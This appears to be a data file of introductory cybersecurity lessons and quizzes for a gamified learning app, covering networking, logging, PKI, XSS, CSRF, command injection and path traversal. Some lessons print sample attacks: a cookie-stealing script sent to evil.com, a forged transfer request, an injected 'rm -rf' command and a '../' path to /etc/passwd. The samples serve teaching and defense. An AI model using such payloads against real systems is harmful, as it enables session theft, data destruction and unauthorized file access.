      "concept": "\n  <p>This distinction shapes almost every conversation about encryption strategy:</p>\n  <ul>\n    <li><b>Data in transit</b> — data actively moving across a network (e.g. your login request traveling to a server). Protected primarily by <b>TLS/HTTPS</b>.</li>\n    <li><b>Data at rest</b> — data sitting in storage (a database, a hard drive, a backup file). Protected by <b>disk/database encryption</b>.</li>\n  </ul>\n  <p>A system can absolutely get one right and the other wrong — e.g. a perfectly encrypted HTTPS connection delivering data into a database that stores everything in plaintext. Both matter, and a security review checks both independently.</p>\n  <div class=\"callout\">There's a third, harder category some systems also need: <b>data in use</b> — data actively being processed in memory, which is the frontier that technologies like \"confidential computing\" and homomorphic encryption try to address.</div>",
      "check": {

    {
      "id": "f19",
      "title": "Understanding logs",
      "concept": "\n  <p><b>Logs</b> are timestamped records of events a system generates — logins, errors, requests, changes. They're the backbone of both troubleshooting and security investigation, because you can't detect or investigate what you didn't record.</p>\n  <p>Common log types you'll encounter:</p>\n  <ul>\n    <li><b>Authentication logs</b> — login attempts, successes, failures</li>\n    <li><b>Access logs</b> — every request a web server received</li>\n    <li><b>System logs</b> — OS-level events (services starting/stopping, errors)</li>\n    <li><b>Firewall/network logs</b> — allowed/blocked connections</li>\n  </ul>\n  <p>A repeated pattern like dozens of failed logins from one IP address in seconds is a classic signature of a <b>brute-force attack</b> — and it's only visible if logging is actually turned on and someone (or something automated) is actually looking at it.</p>",

    {
      "id": "f21",
      "title": "Virtualization & containers",
      "concept": "\n  <p>Modern infrastructure rarely runs directly \"on the metal\" anymore. Two key abstractions:</p>\n  <ul>\n    <li><b>Virtual Machines (VMs)</b> — software emulating an entire computer, each with its own full OS, running on shared physical hardware via a <b>hypervisor</b>.</li>\n    <li><b>Containers</b> (e.g. Docker) — package an application with its dependencies, but share the host machine's OS kernel. Lighter-weight than VMs.</li>\n  </ul>\n  <p>Security implication: containers share a kernel, so a serious enough vulnerability could theoretically let a process \"escape\" a container and affect the host or other containers — a \"container escape.\" VMs have a stronger isolation boundary (the hypervisor) but cost more resources.</p>\n  <div class=\"callout\">This tradeoff — strong isolation vs. lightweight efficiency — is a running theme across security: more isolation is usually safer and always more expensive.</div>",
      "check": {
        "type": "quiz",
        "q": "What's the key architectural difference between a VM and a container?",
        "opts": [
          "Containers use no operating system at all",

      "id": "f22",
      "title": "IPv4 exhaustion & IPv6",
      "concept": "\n  <p>IPv4 addresses (the <code>192.168.1.1</code> style) are 32-bit, giving about 4.3 billion possible addresses. That sounds like a lot until you remember how many devices exist on Earth — we've technically run out, which is exactly why <b>NAT (Network Address Translation)</b> exists: it lets many devices share one public IP by translating private addresses at the router.</p>\n  <p><b>IPv6</b> is the long-term fix — 128-bit addresses, providing an almost incomprehensibly large address space (<code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>-style). Adoption has been slow but steady.</p>\n  <div class=\"callout\">Security-relevant quirk: because IPv6 gives so many devices direct public addresses again, some of the \"protection by obscurity\" NAT accidentally provided (making internal devices hard to directly reach) goes away — meaning firewalls matter even more, not less, on IPv6 networks.</div>",

      "id": "f23",
      "title": "Understanding certificates & PKI, intro",
      "concept": "\n  <p>Before diving deep into cryptography later, it's worth an early plain-language pass at <b>PKI (Public Key Infrastructure)</b> since it underlies HTTPS everywhere.</p>\n  <p>A <b>digital certificate</b> binds a public key to an identity (like a domain name), and is vouched for by a <b>Certificate Authority (CA)</b> — an organization your browser already trusts by default (this trust list ships with your OS/browser).</p>\n  <pre>Browser trusts CA\n  → CA vouches for bank.com's certificate\n    → bank.com's certificate proves its public key is legitimate\n      → browser can now safely encrypt traffic to bank.com</pre>\n  <p>This is a \"chain of trust\" — if any single link breaks (a compromised CA, a stolen private key), the whole chain's guarantee is undermined for whatever depended on it.</p>",

    {
      "id": "f24",
      "title": "The CIA triad",
      "concept": "\n  <p>If cybersecurity has one foundational framework, it's the <b>CIA triad</b> — not the agency, but three properties every security control is ultimately trying to protect:</p>\n  <ul>\n    <li><b>Confidentiality</b> — only authorized parties can view the data. (Broken by: data breaches, eavesdropping.)</li>\n    <li><b>Integrity</b> — data hasn't been tampered with or corrupted. (Broken by: unauthorized modification, corruption.)</li>\n    <li><b>Availability</b> — authorized parties can access data/systems when needed. (Broken by: DDoS attacks, ransomware, outages.)</li>\n  </ul>\n  <p>Nearly every attack type can be mapped onto which leg of the triad it primarily threatens. A DDoS attack targets availability. Tampering with a file in transit targets integrity. A leaked database targets confidentiality. This framework will come up constantly as you go deeper.</p>",

      "id": "f25",
      "title": "Defense in depth",
      "concept": "\n  <p><b>Defense in depth</b> is the principle that you should never rely on a single security control — layer multiple independent defenses so that if one fails, others still stand.</p>\n  <p>A castle analogy actually works well here: a moat, then a wall, then guards, then a locked door, then a vault. An attacker who somehow crosses the moat still has to deal with everything else.</p>\n  <p>In a modern network, this might look like:</p>\n  <pre>Perimeter firewall\n  → Network segmentation\n    → Host-based firewall\n      → Least-privilege access controls\n        → Encryption at rest\n          → Monitoring & alerting</pre>\n  <div class=\"callout warn\">This is precisely why \"we have a firewall\" is never a complete security answer by itself — a single control, however good, is still a single point that can fail or be bypassed.</div>",

      "id": "f26",
      "title": "Principle of least privilege",
      "concept": "\n  <p>The <b>principle of least privilege</b>: every user, process, or system should have only the minimum access necessary to do its job — nothing more.</p>\n  <p>In practice this means:</p>\n  <ul>\n    <li>A marketing employee's account shouldn't have access to production database credentials.</li>\n    <li>A web server process shouldn't run as the \"root\"/admin superuser if it only needs to serve files.</li>\n    <li>An API key for reading data shouldn't also carry permission to delete data.</li>\n  </ul>\n  <p>Why this matters so much: if that account/process is ever compromised, least privilege caps the damage. An attacker who compromises a low-privilege account is stuck with low privilege — they can't do more than that account legitimately could.</p>\n  <div class=\"callout\">This is one of the single most cost-effective security principles that exists — it's mostly about discipline in access design, not expensive tooling.</div>",

      "id": "f27",
      "title": "Vulnerabilities, exploits, and patches",
      "concept": "\n  <p>Three terms that get used loosely but mean distinct things:</p>\n  <ul>\n    <li><b>Vulnerability</b> — a flaw or weakness in software/hardware/process that could potentially be abused.</li>\n    <li><b>Exploit</b> — actual code or a technique that takes advantage of a specific vulnerability.</li>\n    <li><b>Patch</b> — a fix released by the vendor that closes the vulnerability.</li>\n  </ul>\n  <p>Vulnerabilities are tracked publicly using <b>CVE (Common Vulnerabilities and Exposures)</b> identifiers, like <code>CVE-2021-44228</code> (the infamous \"Log4Shell\" vulnerability) — a shared naming system so the whole industry can reference the same issue unambiguously.</p>\n  <p>A <b>zero-day</b> is a vulnerability being actively exploited before the vendor has released (or even knows about) a patch — the defenders have \"zero days\" of advance warning.</p>",

      "id": "f28",
      "title": "Patch management, why it's harder than it sounds",
      "concept": "\n  <p>\"Just apply the patch\" sounds simple. In practice, organizations struggle with patching constantly — remember the Equifax lesson from the Terminal archive earlier? Here's why it's genuinely hard at scale:</p>\n  <ul>\n    <li><b>Testing burden</b> — a patch might break something else; large orgs test before deploying broadly.</li>\n    <li><b>Uptime requirements</b> — some systems can't be taken offline easily to patch (hospitals, factories).</li>\n    <li><b>Asset visibility</b> — you can't patch what you don't know you have. Large organizations often don't have a perfect inventory of every system running every piece of software.</li>\n    <li><b>Legacy systems</b> — some critical old software has no available patch at all, or the vendor no longer supports it.</li>\n  </ul>\n  <div class=\"callout\">This is why \"asset management\" (knowing what you actually have) is considered a foundational security control, not a boring afterthought — you can't defend an inventory you don't know exists.</div>",

      "id": "f29",
      "title": "Backups & the 3-2-1 rule",
      "concept": "\n  <p>A backup strategy is a core availability control — and one of the single most effective defenses against ransomware, since a good backup means you can restore instead of paying.</p>\n  <p>The classic guideline is the <b>3-2-1 rule</b>:</p>\n  <ul>\n    <li><b>3</b> copies of your data (the original + 2 backups)</li>\n    <li><b>2</b> different storage media/types (e.g. local disk + cloud)</li>\n    <li><b>1</b> copy stored offsite (physically or logically separate)</li>\n  </ul>\n  <p>Modern ransomware specifically hunts for and encrypts/deletes connected backups first — which is exactly why an offsite, offline, or otherwise disconnected (\"air-gapped\" or immutable) backup copy matters so much. A backup the ransomware can reach and encrypt too isn't much of a backup.</p>",

      "id": "f31",
      "title": "Understanding file hashes for integrity",
      "concept": "\n  <p>Beyond passwords, hashes serve a completely different everyday purpose: verifying a file hasn't been corrupted or tampered with during download or transfer.</p>\n  <pre>Official site lists:   SHA256: a1b2c3...\nYou download the file, then run:\n  sha256sum downloaded_file.iso\n  → a1b2c3...  (matches! file is intact/authentic)\n  → f9e8d7...  (doesn't match — corrupted OR tampered with)</pre>\n  <p>This is exactly why official software downloads (especially operating system images, security tools) often publish a hash alongside the download link — it lets you independently verify what you received is bit-for-bit identical to what was actually published, regardless of the download path it took to reach you.</p>",

      "id": "f32",
      "title": "The command line vs. GUI mindset",
      "concept": "\n  <p>Newcomers sometimes assume the command line is just \"the hard way\" to do what a graphical interface does easily. In security work specifically, it's often the opposite — genuinely more capable, not just differently styled:</p>\n  <ul>\n    <li><b>Scriptability</b> — a command-line task can be automated and repeated exactly; a GUI workflow generally can't be easily automated</li>\n    <li><b>Remote work</b> — most servers you'll investigate or defend have no graphical interface at all, only remote command-line (SSH) access</li>\n    <li><b>Precision</b> — command-line tools typically expose far more granular options than a simplified GUI ever surfaces</li>\n    <li><b>Chaining tools together</b> — piping one command's output into another (<code>cat file.log | grep error</code>) lets you compose small tools into powerful custom workflows on the fly</li>\n  </ul>\n  <div class=\"callout\">This is exactly why this academy's Terminal missions matter beyond just \"flavor\" — genuine command-line comfort is a real professional prerequisite, not an optional stylistic choice.</div>",

      "id": "f33",
      "title": "What 'the cloud' physically is",
      "concept": "\n  <p>It's worth grounding \"the cloud\" in physical reality: it's simply someone else's data centers — actual buildings, full of actual servers, actual cooling systems, actual physical security guards, in actual geographic locations.</p>\n  <p>Major providers organize this physical infrastructure into:</p>\n  <ul>\n    <li><b>Regions</b> — broad geographic areas (e.g. \"US East,\" \"EU West\")</li>\n    <li><b>Availability Zones</b> — physically separate data centers within a region, so a single data center's failure (power outage, fire, hardware failure) doesn't take down an entire region</li>\n  </ul>\n  <div class=\"callout\">This physical reality matters for both security and compliance — data residency laws (some countries require certain data to physically stay within their borders) and disaster resilience planning both depend on understanding exactly where your data actually, physically lives, not just abstractly \"in the cloud.\"</div>",

      "id": "f34",
      "title": "Bandwidth, latency, and why they're different",
      "concept": "\n  <p>Two networking concepts often conflated but genuinely distinct:</p>\n  <ul>\n    <li><b>Bandwidth</b> — how much data can move per unit time (like the width of a highway — how many cars can travel in parallel)</li>\n    <li><b>Latency</b> — how long it takes data to travel from A to B (like the highway's speed limit and total distance — how long any single car's trip takes)</li>\n  </ul>\n  <p>A connection can have huge bandwidth but still terrible latency (a satellite link moving lots of data, but each individual bit takes a physically long round-trip through space) — which is why \"we have a fast connection\" doesn't automatically mean \"actions feel instantly responsive.\"</p>\n  <div class=\"callout\">Security relevance: some attacks specifically exploit latency-sensitive assumptions (timing attacks, race conditions), and understanding this distinction helps reason clearly about why a system behaves the way it does under different network conditions.</div>",

      "title": "Understanding uptime & the 'nines'",

    {
      "id": "n1",
      "title": "Firewalls: the bouncer",
      "concept": "\n  <p>A <b>firewall</b> is a set of rules that decides which network traffic is allowed in or out. Think of it as a bouncer checking IDs at a door — except the \"ID\" is things like source IP, destination port, and protocol.</p>\n  <pre>ALLOW  in  tcp  port 443   (let HTTPS through)\nALLOW  in  tcp  port 22    from 10.0.0.0/24  (SSH, office only)\nDENY   in  tcp  port 23    (block old insecure telnet)\nDENY   in  *    *          (default: block everything else)</pre>\n  <p>Most real firewalls follow <b>default deny</b>: block everything, then explicitly allow only what's needed. This is safer than \"allow everything except X\" because you can't anticipate every bad thing in advance.</p>",

      "id": "n4",
      "title": "VPNs, actually explained",
      "concept": "\n  <p>A <b>VPN (Virtual Private Network)</b> creates an encrypted tunnel between your device and a VPN server. All your traffic goes through that tunnel before heading out to the internet.</p>\n  <p>What a VPN <b>does</b>:</p>\n  <ul>\n    <li>Hides your traffic's contents and destination from your local network / ISP</li>\n    <li>Makes your traffic appear to originate from the VPN server's location</li>\n  </ul>\n  <p>What a VPN <b>does not</b> do:</p>\n  <ul>\n    <li>Make you anonymous — the VPN provider itself can usually see your traffic</li>\n    <li>Protect you from malware, phishing, or a website that already knows who you are (e.g. because you logged in)</li>\n  </ul>\n  <div class=\"callout warn\">A VPN moves trust, it doesn't remove it — you're trusting the VPN provider instead of your ISP.</div>",

      "id": "n5",
      "title": "Wireless network security",
      "concept": "\n  <p>WiFi security has evolved through several standards, and knowing the difference matters:</p>\n  <ul>\n    <li><b>WEP</b> — ancient, broken, crackable in minutes. Should never be used.</li>\n    <li><b>WPA/WPA2</b> — much stronger, widely used for years, but WPA2 has known handshake-capture attack techniques against weak passwords.</li>\n    <li><b>WPA3</b> — current standard, adds protections against offline password guessing.</li>\n  </ul>\n  <p>Beyond the protocol, an \"Evil Twin\" attack is where someone sets up a rogue access point with the same name as a legitimate network (e.g. \"Airport_WiFi\") to trick devices into connecting to them instead.</p>",
      "check": {
        "type": "quiz",

      "id": "n6",
      "title": "IDS/IPS: watching the wire",
      "concept": "\n  <p>A firewall decides what's <i>allowed</i>. An <b>IDS (Intrusion Detection System)</b> watches traffic that got through and flags anything suspicious. An <b>IPS (Intrusion Prevention System)</b> goes further and actively blocks it in real time.</p>\n  <p>Detection generally works two ways:</p>\n  <ul>\n    <li><b>Signature-based</b> — matches traffic against known attack patterns (fast, but blind to brand-new attacks)</li>\n    <li><b>Anomaly-based</b> — learns \"normal\" behavior and flags deviations (can catch new attacks, but triggers more false alarms)</li>\n  </ul>",

      "id": "n8",
      "title": "DDoS attacks explained",
      "concept": "\n  <p>A <b>DDoS (Distributed Denial of Service)</b> attack floods a target with so much traffic that it can't serve legitimate users — attacking <b>availability</b>, the third leg of the CIA triad.</p>\n  <p>\"Distributed\" is key: instead of one attacking machine (easy to block), attackers use a <b>botnet</b> — thousands of compromised devices (often IoT devices like cameras and routers with weak default passwords) all flooding the target simultaneously from different IPs.</p>\n  <ul>\n    <li><b>Volumetric attacks</b> — simply overwhelm bandwidth with junk traffic</li>\n    <li><b>Protocol attacks</b> — exploit weaknesses in protocols themselves (like SYN floods)</li>\n    <li><b>Application-layer attacks</b> — target specific expensive operations (like search queries) to exhaust server resources with relatively little traffic</li>\n  </ul>\n  <div class=\"callout\">Defenses include traffic scrubbing services, rate limiting, and Content Delivery Networks (CDNs) that absorb and filter traffic before it reaches the origin server.</div>",

      "id": "n9",
      "title": "VLANs in practice",
      "concept": "\n  <p>A <b>VLAN (Virtual Local Area Network)</b> lets you logically segment one physical network into multiple isolated broadcast domains — without needing separate physical switches for each segment.</p>\n  <p>A typical office might use:</p>\n  <pre>VLAN 10 — Corporate workstations\nVLAN 20 — Guest WiFi\nVLAN 30 — VoIP phones\nVLAN 40 — Security cameras / IoT devices</pre>\n  <p>Devices on different VLANs can't talk to each other directly unless a router/firewall explicitly permits it. This means a compromised guest-WiFi device is walled off from corporate workstations by default — a direct, practical application of network segmentation.</p>\n  <div class=\"callout warn\">A common real-world mistake: putting IoT devices (cameras, smart thermostats) on the same VLAN as sensitive workstations. IoT devices are frequently under-patched and make an easy first foothold for an attacker.</div>",

      "id": "n10",
      "title": "Network sniffing & Wireshark concepts",
      "concept": "\n  <p><b>Packet sniffing</b> is capturing and inspecting raw network traffic. Tools like <b>Wireshark</b> let you see literally every packet crossing an interface — source, destination, protocol, and (if unencrypted) the actual content.</p>\n  <p>This is a completely dual-use skill: network engineers use it to diagnose problems, and attackers (or penetration testers) use it to intercept credentials, session tokens, or sensitive data sent without encryption.</p>\n  <pre>No.  Time     Source        Destination   Protocol  Info\n1    0.000    10.0.0.5      10.0.0.1      TCP       SYN\n2    0.001    10.0.0.1      10.0.0.5      TCP       SYN-ACK\n3    0.002    10.0.0.5      10.0.0.1      HTTP      GET /login?user=bob&pass=1234</pre>\n  <div class=\"callout warn\">That last line is exactly why sending credentials over plain HTTP instead of HTTPS is catastrophic — anyone sniffing the network segment sees the password in plaintext, no cracking required.</div>",

      "id": "n11",
      "title": "Honeypots",
      "concept": "\n  <p>A <b>honeypot</b> is a deliberately vulnerable-looking decoy system, set up specifically to attract attackers — giving defenders a way to observe attack techniques in a controlled, isolated environment, far from anything real.</p>\n  <p>Useful properties of a honeypot:</p>\n  <ul>\n    <li>Any interaction with it is inherently suspicious — legitimate users have no reason to touch it</li>\n    <li>It can reveal new attack techniques (useful threat intelligence)</li>\n    <li>It wastes attacker time and resources on something worthless</li>\n  </ul>\n  <div class=\"callout\">A \"honeytoken\" applies the same idea to data instead of systems — a fake credential or fake database record planted specifically so that any use of it immediately signals a breach in progress.</div>",

      "id": "n12",
      "title": "Load balancers & reverse proxies",
      "concept": "\n  <p>A <b>load balancer</b> distributes incoming traffic across multiple backend servers — improving both performance (spreading load) and availability (if one server dies, traffic routes to the others).</p>\n  <p>A <b>reverse proxy</b> sits in front of one or more servers, handling requests on their behalf. It's \"reverse\" because it proxies for the server side, not the client side (a normal/forward proxy sits in front of clients).</p>\n  <p>Security-relevant benefits of a reverse proxy:</p>\n  <ul>\n    <li>Hides the real backend server's IP and details from the internet</li>\n    <li>Can terminate TLS/HTTPS in one central place</li>\n    <li>Can apply rate limiting, filtering, and logging uniformly before traffic even reaches the application</li>\n  </ul>",

      "id": "n13",
      "title": "Network Access Control (NAC) & 802.1X",
      "concept": "\n  <p>How does a network know whether to trust a device plugging into an ethernet port or joining WiFi? <b>Network Access Control (NAC)</b> is the umbrella term for enforcing policy on that question.</p>\n  <p><b>802.1X</b> is a common standard for this: a device must authenticate (often with a certificate or credentials) before it's granted meaningful network access at all — rather than trusting anything physically plugged in.</p>\n  <div class=\"callout\">Without NAC, a classic physical attack becomes trivial: someone walks into an office, finds an open ethernet port in a conference room, plugs in a laptop, and is now sitting inside the \"trusted\" internal network with zero authentication.</div>\n  <p>This connects to a bigger modern idea: <b>Zero Trust</b> — the principle that no device or user should be automatically trusted just because of its network location (\"inside the firewall\"). Every access request gets verified regardless of where it originates.</p>",

      "id": "n14",
      "title": "DNS security: DNSSEC & DNS filtering",
      "concept": "\n  <p>Recall that DNS translates domain names to IPs — but standard DNS has no built-in way to verify responses weren't tampered with. <b>DNSSEC (DNS Security Extensions)</b> fixes this by digitally signing DNS records, letting resolvers verify a response is authentic and unmodified.</p>\n  <p>Separately, <b>DNS filtering</b> is a defensive technique where an organization's DNS resolver refuses to resolve known-malicious domains at all — if a phishing email links to <code>evil-domain.com</code>, and that domain is on a blocklist, the employee's browser can't even look up its IP address, stopping the attack before a connection is ever made.</p>\n  <div class=\"callout\">This is a cheap, high-value control: blocking at the DNS layer stops an enormous range of attacks (malware callbacks, phishing links, ad-based malvertising) with very little performance cost.</div>",

    {
      "id": "n15",
      "title": "Security Information & Event Management (SIEM)",
      "concept": "\n  <p>Modern networks generate an overwhelming volume of logs — far too much for a human to read line by line. A <b>SIEM (Security Information and Event Management)</b> platform centralizes logs from every source (firewalls, servers, applications, endpoints) into one place, correlates events across them, and flags patterns that look suspicious.</p>\n  <p>Example correlation a SIEM might catch that no single log would reveal alone:</p>\n  <pre>03:14 - VPN login for user 'jsmith' from an unusual country\n03:15 - same user account accesses the finance database for the first time ever\n03:16 - large data export initiated from that database</pre>\n  <p>Individually, none of these three events might trigger an alert. Together, correlated by time and account, they paint a clear picture worth immediate investigation — that's the entire value proposition of a SIEM.</p>",

      "id": "n17",
      "title": "Bluetooth & short-range wireless risks",
      "concept": "\n  <p>WiFi isn't the only wireless attack surface. <b>Bluetooth</b> has its own history of vulnerabilities:</p>\n  <ul>\n    <li><b>Bluejacking</b> — sending unsolicited messages/data to nearby Bluetooth devices (mostly a nuisance, not dangerous by itself)</li>\n    <li><b>Bluesnarfing</b> — unauthorized access to data (contacts, messages) on a device via a Bluetooth vulnerability</li>\n    <li><b>BlueBorne</b> (2017) — a serious set of vulnerabilities that let attackers take over devices via Bluetooth with zero user interaction required, just proximity</li>\n  </ul>\n  <div class=\"callout\">General principle: any wireless protocol expands your attack surface to \"anyone nearby,\" not just \"anyone on the internet\" — which is why disabling unused wireless radios (Bluetooth, NFC) on sensitive devices is a legitimate hardening step.</div>",

      "id": "n19",
      "title": "Firewalls: stateful vs. stateless",
      "concept": "\n  <p>Not all firewalls work the same way:</p>\n  <ul>\n    <li><b>Stateless firewall</b> — examines each packet in isolation against static rules. Fast, but \"dumb\" — it doesn't know if a packet is part of an established, legitimate conversation.</li>\n    <li><b>Stateful firewall</b> — tracks the state of active connections. It knows \"this packet is a reply to a connection we approved earlier,\" letting it make smarter decisions and block unsolicited traffic more precisely.</li>\n  </ul>\n  <p>Most modern firewalls are stateful by default. The next evolution is the <b>Next-Generation Firewall (NGFW)</b>, which adds deeper inspection — understanding actual application traffic (not just ports), intrusion prevention, and sometimes even user identity awareness.</p>",

      "id": "n21",
      "title": "Proxy servers, forward vs. reverse",
      "concept": "\n  <p>We covered reverse proxies briefly earlier — worth contrasting explicitly with a <b>forward proxy</b>:</p>\n  <ul>\n    <li><b>Forward proxy</b> — sits in front of clients, making requests on their behalf. Common uses: corporate content filtering (blocking certain websites for employees), or bundling many clients' traffic to appear as one source.</li>\n    <li><b>Reverse proxy</b> — sits in front of servers, as covered before, handling requests on the server's behalf.</li>\n  </ul>\n  <p>An easy way to remember the distinction: a forward proxy hides/manages who's making the request (the client side); a reverse proxy hides/manages who's serving the response (the server side).</p>",

      "id": "n22",
      "title": "Network Time Protocol (NTP) & why time matters",
      "concept": "\n  <p>An easy-to-overlook but genuinely important service: <b>NTP</b> keeps a device's clock synchronized to an accurate reference time. Why does this matter for security specifically?</p>\n  <ul>\n    <li><b>Log correlation</b> — recall the SIEM lesson; correlating events across multiple systems is meaningless if each system's clock disagrees about what time it currently is</li>\n    <li><b>Certificate validation</b> — certificates have expiration dates; a device with a badly wrong clock might incorrectly reject valid certificates, or worse, accept expired ones</li>\n    <li><b>Authentication protocols</b> — some authentication schemes (like time-based one-time password 2FA codes) depend on reasonably synchronized clocks between the two parties to work at all</li>\n  </ul>\n  <div class=\"callout\">NTP itself has historically had its own vulnerabilities (it's been abused as a DDoS amplification vector) — a reminder that even seemingly mundane infrastructure services are part of the genuine attack surface.</div>",

      "id": "n23",
      "title": "Air-gapped networks",
      "concept": "\n  <p>Recall the Stuxnet archive entry — an <b>air-gapped</b> network is physically isolated, with no direct connection to the internet or any other outside network at all. Used for extremely sensitive environments: industrial control systems, classified government networks, certain critical infrastructure.</p>\n  <p>The security tradeoff is real:</p>\n  <ul>\n    <li>Eliminates entire categories of remote network-based attacks</li>\n    <li>But doesn't eliminate risk entirely — physical media (USB drives), insider threats, and supply-chain compromise (malicious hardware/firmware) remain viable paths in, as Stuxnet itself demonstrated</li>\n    <li>Makes routine operations (software updates, monitoring, data transfer) genuinely more operationally difficult, which sometimes leads to worse patch hygiene in practice, ironically increasing risk elsewhere</li>\n  </ul>",

      "title": "Cross-Site Scripting (XSS)",
      "concept": "\n  <p><b>XSS</b> happens when an attacker gets malicious JavaScript to run in another user's browser, usually by injecting it into a page that doesn't properly sanitize input.</p>\n  <p>Example: a comment box that displays user comments without escaping HTML. An attacker posts:</p>\n  <pre>&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</pre>\n  <p>Every visitor who views that comment now runs the attacker's script — which can steal cookies, log keystrokes, or silently perform actions as that user.</p>\n  <ul>\n    <li><b>Stored XSS</b> — the payload is saved on the server (like our comment) and hits every viewer.</li>\n    <li><b>Reflected XSS</b> — the payload is in the request itself (like a malicious link) and only fires for whoever clicks it.</li>\n  </ul>\n  <div class=\"callout\">Defense: escape/encode all user input before rendering it as HTML, and use a Content-Security-Policy header.</div>",
      "check": {
        "type": "quiz",
        "q": "What's the difference between stored and reflected XSS?",
        "opts": [
          "Stored XSS only works on mobile devices",
          "Stored XSS payloads are saved server-side and affect every viewer; reflected XSS only fires per malicious link/request",
          "Reflected XSS is more dangerous in every case",
          "There is no real difference"
        ],
        "correct": 1,
        "explain": "Stored XSS persists in the database/page itself, hitting anyone who views it, while reflected XSS requires tricking a victim into clicking a specific crafted link."
      },
      "xp": 26,
      "credits": 11
    },
    {
      "id": "w3",
      "title": "Cookies & sessions",
      "concept": "\n  <p>HTTP is <b>stateless</b> — by default, a server doesn't remember you between requests. <b>Cookies</b> and <b>sessions</b> are how sites work around that.</p>\n  <ol>\n    <li>You log in. The server creates a session and gives your browser a <b>session cookie</b> — a unique token like <code>session=a91f3d...</code></li>\n    <li>Your browser sends that cookie on every future request to that site.</li>\n    <li>The server looks up the session token and knows \"oh, this is Leo, logged in.\"</li>\n  </ol>\n  <p>Important cookie security flags:</p>\n  <ul>\n    <li><code>HttpOnly</code> — JavaScript can't read the cookie (blocks XSS cookie theft)</li>\n    <li><code>Secure</code> — cookie is only sent over HTTPS, never plain HTTP</li>\n    <li><code>SameSite</code> — restricts the cookie being sent from other sites (helps prevent CSRF)</li>\n  </ul>",
      "check": {

        "q": "What does the HttpOnly cookie flag protect against?",
        "opts": [

          "Man-in-the-middle interception"
        ],
        "correct": 1,
        "explain": "HttpOnly specifically blocks client-side JavaScript from accessing the cookie, which limits what an XSS attack can steal."
      },
      "xp": 24,

    {
      "id": "w4",
      "title": "CSRF: the forged request",
      "concept": "\n  <p><b>Cross-Site Request Forgery (CSRF)</b> tricks a logged-in user's browser into sending a request they didn't intend — because the browser automatically attaches cookies to requests, including ones triggered by another site.</p>\n  <p>Example: you're logged into <code>bank.com</code>. You visit a malicious page containing:</p>\n  <pre>&lt;img src=\"https://bank.com/transfer?to=attacker&amp;amount=1000\"&gt;</pre>\n  <p>Your browser automatically loads that \"image,\" sending your bank cookies along with it. If the bank doesn't check anything besides \"is this a valid session,\" the transfer might go through — even though you never meant to do it.</p>\n  <div class=\"callout\">Defense: CSRF tokens (a random value the form must include, that an outside page can't guess) and the SameSite cookie flag.</div>",

    {
      "id": "w5",
      "title": "Authentication vs. authorization",
      "concept": "\n  <p>These two terms get mixed up constantly, but they're distinct:</p>\n  <ul>\n    <li><b>Authentication</b> — \"who are you?\" Proving identity (password, 2FA, biometrics).</li>\n    <li><b>Authorization</b> — \"what are you allowed to do?\" Permissions after identity is confirmed.</li>\n  </ul>\n  <p>A huge class of real bugs is <b>broken authorization</b> — the system correctly identifies you, but fails to check whether you should actually be allowed to see/do something. Example: <b>IDOR (Insecure Direct Object Reference)</b>, where changing a URL like <code>/invoice?id=1002</code> to <code>/invoice?id=1003</code> shows someone else's invoice because the server never checked that invoice 1003 belongs to you.</p>",

    {
      "id": "w6",
      "title": "HTTPS & TLS in plain terms",
      "concept": "\n  <p><b>TLS (Transport Layer Security)</b> is what turns HTTP into HTTPS — it encrypts the connection between browser and server so eavesdroppers can't read or tamper with it.</p>\n  <p>The short version of what happens when you connect:</p>\n  <ol>\n    <li>Browser and server agree on encryption methods to use (\"cipher suite negotiation\")</li>\n    <li>Server proves its identity with a <b>certificate</b>, issued by a trusted Certificate Authority</li>\n    <li>Both sides derive a shared secret key without ever sending that key in the clear</li>\n    <li>All further traffic is encrypted with that shared key</li>\n  </ol>\n  <p>That's why a fake bank site can't just copy the real HTTPS padlock — it can't produce a valid certificate for the real domain without controlling that domain or compromising a Certificate Authority.</p>",

    {
      "id": "w8",
      "title": "Command injection",
      "concept": "\n  <p>Similar spirit to SQL injection, but the target is the operating system shell rather than a database. <b>Command injection</b> happens when user input is passed unsafely into a system command.</p>\n  <p>Imagine a website feature that pings a user-supplied hostname:</p>\n  <pre>$hostname = $_GET['host'];\nsystem(\"ping -c 4 \" . $hostname);</pre>\n  <p>If a user submits <code>google.com; rm -rf /important-data</code> as the hostname, and the application doesn't validate input, the shell happily executes both commands in sequence — the ping AND the destructive second command.</p>\n  <div class=\"callout\">Defense: avoid shelling out to the OS with user input at all where possible; if unavoidable, use strict allowlisting of characters and proper escaping/argument-passing APIs instead of string concatenation.</div>",

        "explain": "The semicolon (or similar shell metacharacters) lets an attacker append entirely new commands when input isn't properly sanitized or escaped before hitting the shell."

    {
      "id": "w9",
      "title": "Directory traversal",
      "concept": "\n  <p><b>Directory (path) traversal</b> exploits insufficient validation of file paths supplied by a user, letting an attacker access files outside the intended directory.</p>\n  <pre>https://example.com/download?file=report.pdf\n                     ↓ attacker modifies to:\nhttps://example.com/download?file=../../../../etc/passwd</pre>\n  <p>The <code>../</code> sequence means \"go up one directory\" — stacked enough times, it can climb all the way to the filesystem root and then descend into sensitive files never meant to be exposed, like system configuration or credential files.</p>\n  <div class=\"callout\">Defense: never build file paths directly from user input. Validate against an allowlist of permitted filenames, resolve the final path and confirm it's still within the intended directory, and use OS/framework APIs designed to prevent traversal.</div>",

    {
      "id": "w10",
      "title": "Security headers, a practical tour",
      "concept": "\n  <p>HTTP response headers can meaningfully harden a website with almost no development effort. A few of the most impactful:</p>\n  <ul>\n    <li><code>Content-Security-Policy</code> — restricts which sources scripts/styles/images can load from, dramatically limiting what XSS can accomplish even if it occurs</li>\n    <li><code>Strict-Transport-Security (HSTS)</code> — tells browsers \"always use HTTPS for this site, never fall back to HTTP,\" blocking downgrade attacks</li>\n    <li><code>X-Frame-Options</code> — prevents the page from being embedded in an <code>&lt;iframe&gt;</code> on another site, blocking \"clickjacking\" attacks</li>\n    <li><code>X-Content-Type-Options: nosniff</code> — stops the browser from guessing content types in ways that can enable certain attacks</li>\n  </ul>\n  <div class=\"callout\">A surprising number of production websites, even large ones, ship without several of these — checking response headers is often one of the fastest ways to assess a site's baseline security hygiene.</div>",
      "check": {
        "type": "quiz",
        "q": "What does the X-Frame-Options header primarily protect against?",
        "opts": [

          "Clickjacking — the page being secretly embedded in an iframe on a malicious site",
          "DDoS attacks",
          "Weak passwords"
        ],
        "correct": 1,
        "explain": "X-Frame-Options controls whether/how a page can be framed by another site, which is exactly the mechanism clickjacking relies on."
